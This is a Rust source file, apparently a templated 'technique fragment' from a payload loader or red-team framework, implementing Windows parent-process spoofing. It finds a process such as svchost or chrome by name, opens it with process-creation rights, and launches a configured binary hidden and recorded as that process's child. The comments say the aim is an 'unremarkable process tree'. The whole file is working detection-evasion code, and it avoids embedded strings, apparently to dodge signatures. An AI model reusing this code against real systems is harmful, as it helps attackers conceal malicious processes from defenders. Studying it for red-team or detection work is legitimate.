// --- Parent-process spoofing (control technique fragment) ---
//
// Launches the configured binary so that Windows records the configured parent
// as its creator instead of the loader. Pure Win32: CreateProcessA with
// EXTENDED_STARTUPINFO_PRESENT and a one-entry attribute list carrying
// PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.
//
// Per-build values arrive as placeholders substituted by `Params::render_fragment`
// (the binary, its arguments, the parent's name, every diagnostic). This file
// must not hold a runtime string literal of its own; see
// `src/techniques/README.md`.

use windows::core::{PCSTR, PSTR};
use windows::Win32::Foundation::{BOOL, CloseHandle, HANDLE};
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::Threading::{
    CreateProcessA, DeleteProcThreadAttributeList, GetExitCodeProcess,
    InitializeProcThreadAttributeList, OpenProcess, UpdateProcThreadAttribute,
    WaitForSingleObject, CREATE_NO_WINDOW, EXTENDED_STARTUPINFO_PRESENT, INFINITE,
    LPPROC_THREAD_ATTRIBUTE_LIST, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, PROCESS_CREATE_PROCESS,
    PROCESS_INFORMATION, STARTUPINFOEXA,
};

/// Converts a NUL-terminated UTF-16 buffer (a snapshot entry's executable name)
/// into a `String`.
fn wide_to_string(raw: &[u16]) -> String {
    let len = raw.iter().position(|unit| *unit == 0).unwrap_or(raw.len());
    String::from_utf16_lossy(&raw[..len])
}

/// Returns the last component of `name`, so a configured path still matches the
/// bare file name a process snapshot reports.
fn file_name_of(name: &str) -> &str {
    name.rsplit(['\\', '/']).next().unwrap_or(name)
}

/// Returns the PID of the first running process whose executable name matches
/// `parent` (case-insensitive; a path is compared by its file name).
///
/// The technique's whole point is an unremarkable process tree, so the first
/// match wins and the choice is documented rather than ranked: with several
/// instances of the same name (svchost, chrome, ...) any of them is as
/// unremarkable as the others.
fn find_parent_pid(parent: &str) -> Result<u32, String> {
    let wanted = file_name_of(parent).to_ascii_lowercase();
    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) }
        .map_err(|error| format!("{}: {error}", $MSG_SNAPSHOT_FAILED$))?;

    let mut entry = PROCESSENTRY32W {
        dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
        ..Default::default()
    };

    if let Err(error) = unsafe { Process32FirstW(snapshot, &mut entry) } {
        let _ = unsafe { CloseHandle(snapshot) };
        return Err(format!("{}: {error}", $MSG_ENUM_FAILED$));
    }

    let mut found = None;
    loop {
        if wide_to_string(&entry.szExeFile).to_ascii_lowercase() == wanted {
            found = Some(entry.th32ProcessID);
            break;
        }
        if unsafe { Process32NextW(snapshot, &mut entry) }.is_err() {
            break;
        }
    }
    let _ = unsafe { CloseHandle(snapshot) };

    found.ok_or_else(|| format!("{} '{parent}'", $MSG_PARENT_NOT_FOUND$))
}

/// Resolves a bare binary name against the system directory (a path is used as
/// is).
fn resolve_binary(name: &str) -> String {
    if name.contains('\\') || name.contains('/') {
        return name.to_string();
    }
    let root = std::env::var($ENV_SYSTEMROOT$).unwrap_or_else(|_| $WINDOWS_FALLBACK$.to_string());
    format!("{root}\\{}\\{name}", $SYSTEM32_DIR$)
}

/// Quotes one argument for a Windows command line (`CommandLineToArgvW`
/// semantics: backslash and quote handling).
fn quote_arg(arg: &str) -> String {
    if !arg.is_empty() && !arg.bytes().any(|b| b == b' ' || b == b'\t' || b == b'"') {
        return arg.to_string();
    }
    let mut out = String::from("\"");
    let mut backslashes = 0usize;
    for ch in arg.chars() {
        match ch {
            '\\' => {
                backslashes += 1;
                out.push('\\');
            }
            '"' => {
                for _ in 0..backslashes {
                    out.push('\\');
                }
                out.push('\\');
                out.push('"');
                backslashes = 0;
            }
            _ => {
                backslashes = 0;
                out.push(ch);
            }
        }
    }
    for _ in 0..backslashes {
        out.push('\\');
    }
    out.push('"');
    out
}

/// Launches the configured binary with the configured process as its recorded
/// parent.
///
/// Returns the child's exit code when the step's `wait` is set. Without `wait`
/// the child is left running, its exit code is never observed and this returns
/// `0`: the loader no longer owns the child's lifetime, and the chain still
/// needs a code.
pub fn run_exec() -> Result<i32, String> {
    let binary: String = $BINARY_DEF$;
    let args: Vec<String> = $ARGS_DEF$;
    let parent: String = $PARENT_DEF$;
    let wait: bool = $WAIT$;

    if binary.is_empty() {
        return Err($MSG_NO_BINARY$.to_string());
    }
    if parent.is_empty() {
        return Err($MSG_NO_PARENT$.to_string());
    }

    // 1. The parent is named, not a PID: find the first process with that name.
    let parent_pid = find_parent_pid(&parent)?;

    // 2. The attribute takes a *handle* with PROCESS_CREATE_PROCESS access, not
    // a PID. The list stores a pointer to this handle, so it must outlive
    // `CreateProcessA`: it is deliberately a named local (an address taken from
    // a temporary here would dangle — the classic bug in this technique).
    let parent_handle = unsafe { OpenProcess(PROCESS_CREATE_PROCESS, BOOL(0), parent_pid) }
        .map_err(|error| format!("{} '{parent}': {error}", $MSG_PARENT_OPEN_FAILED$))?;

    // 3. Size the attribute list: the first call is documented to fail with
    // ERROR_INSUFFICIENT_BUFFER and only reports the required size, so its
    // error is expected. The buffer is allocated in `usize` units because the
    // opaque list holds pointers and a byte buffer is not guaranteed to be
    // pointer-aligned.
    let mut attr_size = 0usize;
    let _ = unsafe {
        InitializeProcThreadAttributeList(
            LPPROC_THREAD_ATTRIBUTE_LIST(std::ptr::null_mut()),
            1,
            0,
            &mut attr_size,
        )
    };
    if attr_size == 0 {
        let _ = unsafe { CloseHandle(parent_handle) };
        return Err($MSG_ATTR_SIZE_FAILED$.to_string());
    }

    let mut attr_storage = vec![0usize; attr_size.div_ceil(std::mem::size_of::<usize>())];
    let attr_list =
        LPPROC_THREAD_ATTRIBUTE_LIST(attr_storage.as_mut_ptr() as *mut core::ffi::c_void);
    if let Err(error) = unsafe { InitializeProcThreadAttributeList(attr_list, 1, 0, &mut attr_size) }
    {
        let _ = unsafe { CloseHandle(parent_handle) };
        return Err(format!("{}: {error}", $MSG_ATTR_INIT_FAILED$));
    }

    // 4. Declare the parent. `lpValue` points at the handle and its size is the
    // size of the pointed-at value.
    if let Err(error) = unsafe {
        UpdateProcThreadAttribute(
            attr_list,
            0,
            PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
            Some(&parent_handle as *const HANDLE as *const core::ffi::c_void),
            std::mem::size_of::<HANDLE>(),
            None,
            None,
        )
    } {
        unsafe { DeleteProcThreadAttributeList(attr_list) };
        let _ = unsafe { CloseHandle(parent_handle) };
        return Err(format!("{}: {error}", $MSG_ATTR_UPDATE_FAILED$));
    }

    // 5. Build the child's command line. The child is not the payload: the
    // payload's own arguments (`build.payloads.<name>.args`) never reach it,
    // only this step's `binary` and `args` do.
    let exe = resolve_binary(&binary);
    let mut command = quote_arg(&exe);
    for arg in &args {
        command.push(' ');
        command.push_str(&quote_arg(arg));
    }
    let mut app = exe.as_bytes().to_vec();
    app.push(0);
    let mut cmdline = Vec::with_capacity(command.len() + 1);
    cmdline.extend_from_slice(command.as_bytes());
    cmdline.push(0);

    let mut startup: STARTUPINFOEXA = unsafe { std::mem::zeroed() };
    // With EXTENDED_STARTUPINFO_PRESENT, `cb` is the size of the *extended*
    // structure and `lpAttributeList` is the list built above.
    startup.StartupInfo.cb = std::mem::size_of::<STARTUPINFOEXA>() as u32;
    startup.lpAttributeList = attr_list;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let created = unsafe {
        CreateProcessA(
            PCSTR(app.as_ptr()),
            PSTR(cmdline.as_mut_ptr()),
            None,
            None,
            BOOL(0),
            EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
            None,
            PCSTR::null(),
            &startup.StartupInfo,
            &mut pi,
        )
    };

    // The kernel has consumed both by now; release them before the `?` below
    // can return early.
    unsafe { DeleteProcThreadAttributeList(attr_list) };
    drop(attr_storage);
    let _ = unsafe { CloseHandle(parent_handle) };

    created.map_err(|error| format!("{} '{command}': {error}", $MSG_CREATE_FAILED$))?;

    // 6. Wait for the child (and relay its exit code) or leave it running.
    let code = if wait {
        let _ = unsafe { WaitForSingleObject(pi.hProcess, INFINITE) };
        let mut exit_code = 0u32;
        let read = unsafe { GetExitCodeProcess(pi.hProcess, &mut exit_code) };
        let _ = unsafe { CloseHandle(pi.hThread) };
        let _ = unsafe { CloseHandle(pi.hProcess) };
        read.map_err(|error| format!("{}: {error}", $MSG_WAIT_FAILED$))?;
        exit_code as i32
    } else {
        let _ = unsafe { CloseHandle(pi.hThread) };
        let _ = unsafe { CloseHandle(pi.hProcess) };
        0
    };

    Ok(code)
}
